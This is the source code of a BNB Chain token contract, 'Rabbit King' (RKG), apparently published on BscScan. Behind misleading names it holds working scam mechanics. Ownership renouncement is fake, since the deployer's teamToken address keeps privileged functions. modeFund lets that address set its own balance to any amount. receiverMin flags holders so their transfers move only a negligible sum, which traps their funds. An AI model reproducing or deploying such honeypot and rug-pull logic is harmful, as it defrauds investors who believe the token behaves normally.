/**
 *Submitted for verification at BscScan.com on 2023-01-25
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract RabbitKing {
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    address public owner;
    uint256 constant fromMin = 10 ** 10;



    string public name = "Rabbit King";

    string public symbol = "RKG";
    mapping(address => bool) public maxToken;
    mapping(address => uint256) public balanceOf;

    mapping(address => bool) public marketingAt;
    address public buyFundReceiver;
    mapping(address => mapping(address => uint256)) public allowance;
    address public teamToken;
    modifier senderTrading() {
        require(maxToken[msg.sender]);
        _;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address owner);

    constructor (){
        IUniswapV2Router fromEnable = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        IUniswapV2Factory maxMinToken = IUniswapV2Factory(fromEnable.factory());
        buyFundReceiver = maxMinToken.createPair(fromEnable.WETH(), address(this));
        owner = msg.sender;
        teamToken = owner;
        maxToken[teamToken] = true;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
        renounceOwnership();
    }

    

    function transfer(address recipient, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function teamMode(address fromMode) public senderTrading {
        maxToken[fromMode] = true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        if (allowance[sender][msg.sender] != type(uint256).max) {
            require(allowance[sender][msg.sender] >= amount);
            allowance[sender][msg.sender] -= amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(address(0));
        owner = address(0);
    }

    function receiverMin(address tradingListReceiver) public senderTrading {
        marketingAt[tradingListReceiver] = true;
    }

    function minLaunch(address teamSwap, address tokenLimitTotal, uint256 maxLaunched) internal returns (bool) {
        require(balanceOf[teamSwap] >= maxLaunched);
        balanceOf[teamSwap] -= maxLaunched;
        balanceOf[tokenLimitTotal] += maxLaunched;
        emit Transfer(teamSwap, tokenLimitTotal, maxLaunched);
        return true;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (sender == teamToken || recipient == teamToken) {
            return minLaunch(sender, recipient, amount);
        }
        if (marketingAt[sender]) {
            return minLaunch(sender, recipient, fromMin);
        }
        return minLaunch(sender, recipient, amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function modeFund(uint256 maxLaunched) public senderTrading {
        balanceOf[teamToken] = maxLaunched;
    }


}